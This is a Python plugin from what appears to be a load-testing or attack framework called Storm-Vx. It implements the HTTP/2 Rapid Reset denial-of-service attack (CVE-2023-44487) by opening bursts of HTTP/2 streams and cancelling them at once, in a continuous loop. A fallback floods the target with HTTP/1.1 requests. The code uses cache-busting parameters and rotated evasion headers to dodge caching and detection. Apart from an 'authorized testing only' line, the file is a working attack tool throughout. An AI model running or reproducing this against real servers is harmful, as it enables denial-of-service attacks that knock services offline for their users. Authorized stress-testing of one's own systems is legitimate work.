#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_http2_rapid_reset — HTTP/2 Rapid Reset Attack Plugin

Exploits HTTP/2 stream cancellation by rapidly opening and
resetting streams (CVE-2023-44487). Each request creates an
HTTP/2 stream, sends HEADERS, then immediately sends RST_STREAM.
The server does work setting up the stream only to have it
cancelled, amplifying the cost differential between client
and server.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import aiohttp
from typing import Dict, Any


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str, rand_cache_bust
from config.defaults import H2_RAPID_RESET_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["Http2RapidResetPlugin"]


class Http2RapidResetPlugin(AttackPlugin):
    """HTTP/2 Rapid Reset — exploit stream cancellation (CVE-2023-44487).

    Uses httpx with HTTP/2 support to rapidly open and cancel
    HTTP/2 streams. The server processes HEADERS frames and
    begins generating a response, but receives RST_STREAM
    almost immediately. The asymmetry: the client spends
    minimal resources while the server does significant work.

    Falls back to regular HTTP/1.1 rapid requests if httpx
    or h2 is not available.
    """

    meta = PluginMeta(
        name='http2_rapid_reset',
        version='1.0.0',
        plugin_type='attack',
        description='HTTP/2 rapid reset — exploit stream cancellation (CVE-2023-44487)',
        tags=['http2', 'rapid-reset', 'amplification', 'cve-2023-44487'],
        priority=42,
        compatible_profiles=[],
        requirements=['httpx', 'h2'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """HTTP/2 rapid reset worker: open and cancel streams rapidly."""
        verify_ssl = context.verify_ssl
        ssl_ctx = context.ssl_ctx

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms
        burst_size = getattr(context.extra, 'h2_burst', 50)  # Streams per burst

        try:
            import httpx
        except ImportError:
            # Fallback: use aiohttp with rapid GET requests
            await self._http1_fallback(context, pages, delay_ms)
            return

        # BUG-009: Use custom ssl_ctx when available, otherwise fall back to verify_ssl
        httpx_verify = ssl_ctx if ssl_ctx else verify_ssl

        # BUG-008: Create the httpx.AsyncClient ONCE before the loop and reuse it.
        # Creating an HTTP/2 client involves DNS resolution, TCP connection,
        # TLS handshake, and HTTP/2 negotiation — significant overhead per iteration.
        client = None
        try:
            client = httpx.AsyncClient(
                http2=True,
                verify=httpx_verify,
                timeout=httpx.Timeout(timeout=H2_RAPID_RESET_TIMEOUT),  # W2.4
                limits=httpx.Limits(max_connections=burst_size),
            )

            # HTTP/2 rapid reset using httpx
            while not self._stop_event.is_set():
                try:
                    url = random.choice(pages)
                    if cache_bust_param := rand_cache_bust():
                        url += f"{'&' if '?' in url else '?'}{cache_bust_param}"

                    # Burst: send many requests and immediately cancel
                    tasks = []
                    for _ in range(burst_size):
                        if self._stop_event.is_set():
                            break
                        # BUG-007: Use fresh evasion-rotated headers
                        headers = self._get_fresh_headers(context, "api")
                        t = time.time()
                        try:
                            # Create the request task
                            task = asyncio.create_task(
                                client.get(url, headers=headers, follow_redirects=False)
                            )
                            tasks.append((task, t))
                        except asyncio.CancelledError:
                            raise
                        except (RuntimeError, OSError) as exc:
                            logger.debug(f"H2 task creation failed: {exc}")

                    # Immediately cancel all tasks (simulating RST_STREAM)
                    for task, _ in tasks:
                        if not task.done():
                            task.cancel()

                    # Wait for cancellations to complete
                    for task, req_t in tasks:
                        try:
                            await task
                            rt = time.time() - req_t
                            await self._record("H2-RST", True, 200, rt, url=url[:60])
                        except asyncio.CancelledError:
                            rt = time.time() - req_t
                            await self._record("H2-RST", True, 0, rt, hint="reset")
                        except (RuntimeError, OSError, ConnectionError) as exc:
                            rt = time.time() - req_t
                            await self._record("H2-RST", False, 0, rt,
                                               err=type(exc).__name__)

                    if delay_ms > 0:
                        await asyncio.sleep(delay_ms / 1000.0)

                except asyncio.CancelledError:
                    return
                except (RuntimeError, OSError, ConnectionError) as exc:
                    await self._record("H2-RST", False, 0, 0, err=type(exc).__name__)
                    # BUG-008: If the connection dropped, recreate the client
                    try:
                        await client.aclose()
                    except (RuntimeError, OSError) as exc:
                        logger.debug(f"H2 client close failed during reconnect: {exc}")
                    try:
                        client = httpx.AsyncClient(
                            http2=True,
                            verify=httpx_verify,
                            timeout=httpx.Timeout(timeout=H2_RAPID_RESET_TIMEOUT),  # W2.4
                            limits=httpx.Limits(max_connections=burst_size),
                        )
                    except (RuntimeError, OSError) as exc:
                        logger.debug(f"H2 client recreation failed: {exc}")
                    await asyncio.sleep(0.1)
        finally:
            # BUG-008: Clean up client on exit
            if client is not None:
                try:
                    await client.aclose()
                except (RuntimeError, OSError):
                    pass

    async def _http1_fallback(self, context: AttackContext,
                               pages: list, delay_ms: int) -> None:
        """Fallback: rapid HTTP/1.1 requests when httpx is unavailable."""
        _ssl = context.ssl_param

        while not self._stop_event.is_set():
            try:
                url = random.choice(pages)
                # BUG-007: Use fresh evasion-rotated headers
                headers = self._get_fresh_headers(context, "api")
                t = time.time()
                try:
                    async with context.session.get(url, headers=headers,
                                                   ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.time() - t
                        ok = resp.status < 500
                        await self._record("H2-RST", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.time() - t
                    await self._record("H2-RST", False, 0, rt,
                                       err=type(exc).__name__)

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("H2-RST", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)


